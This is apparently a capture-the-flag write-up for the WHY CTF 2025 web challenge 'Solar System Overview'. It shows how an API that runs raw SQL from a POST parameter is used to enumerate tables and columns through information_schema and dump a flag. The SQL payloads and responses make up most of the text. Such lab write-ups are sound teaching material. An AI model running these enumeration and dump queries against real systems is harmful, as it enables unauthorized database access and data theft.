# WHY CTF 2025 Challenge Write-Up — “Solar System Overview”

**Author:** Akshatshirsat  
**Published:** August 14, 2025  
**Tags:** CTF Writeup, Penetration Testing, Cybersecurity, WHY2025

## Challenge Type

Web Exploitation → SQL Injection via API endpoint

## Recon

On visiting the given URL, the page loads a “Solar System Overview” interface, with a list of planets and their descriptions.

<!-- Original article contains an image here. The image asset was not retrievable from the Medium page extraction. -->

Looking at the page source revealed the following JavaScript snippet:

```javascript
fetch("/api.php", {
    method: "POST",
    body: "query=SELECT * FROM planets",
    headers: {"Content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
})
.then(response => response.json())
.then(response => addPlanets(response))
```

This means:

- The frontend sends raw SQL queries via the `query` parameter to `/api.php`.
- The server responds with query results in JSON format.

## Vulnerability

The backend executes whatever SQL query is sent in the `query` POST parameter without sanitization or prepared statements.

This is essentially an SQL query execution API — any SQL command can be run.

## Exploitation Steps

### Step 1 — Test SQL Injection

Using an API tester (Postman, curl, etc.), send:

```http
POST /api.php
Content-Type: application/x-www-form-urlencoded

query=SELECT database(), user(), version()
```

**Response:**

```json
[{"id":1,"name":"planets","image":"planets_user@localhost","description":"8.0.42-0ubuntu0.24.04.2"}]
```

This confirms arbitrary SQL execution.

### Step 2 — Enumerate tables

```sql
SELECT table_name, 'x', 'y'
FROM information_schema.tables
WHERE table_schema = database()
```

**Response:**

```json
[
  {"TABLE_NAME":"abandoned_planets","x":"x","y":"y"},
  {"TABLE_NAME":"planets","x":"x","y":"y"}
]
```

Found a suspicious table: `abandoned_planets`.

### Step 3 — Enumerate columns

```sql
SELECT column_name, 'x', 'y'
FROM information_schema.columns
WHERE table_name = 'abandoned_planets'
```

**Response:**

```json
[
  {"COLUMN_NAME":"description","x":"x","y":"y"},
  {"COLUMN_NAME":"id","x":"x","y":"y"},
  {"COLUMN_NAME":"image","x":"x","y":"y"},
  {"COLUMN_NAME":"name","x":"x","y":"y"}
]
```

### Step 4 — Dump the flag

We suspect the `description` column holds the flag:

```sql
SELECT description, 'x', 'y'
FROM abandoned_planets
```

**Response:**

<!-- Original article contains an image here. The image asset was not retrievable from the Medium page extraction. -->

```json
[
  {"description":"CTF{super_secret_flag_here}","x":"x","y":"y"}
]
```

The backend directly interpolates user-controlled input into SQL queries without sanitization or parameterization.

This allows full arbitrary SQL execution, leading to complete database compromise.

---

**Source:** [Original Medium article](https://medium.com/@akshatshirsat77/why-ctf-2025-challenge-write-up-solar-system-overview-8b92ee94feb6)
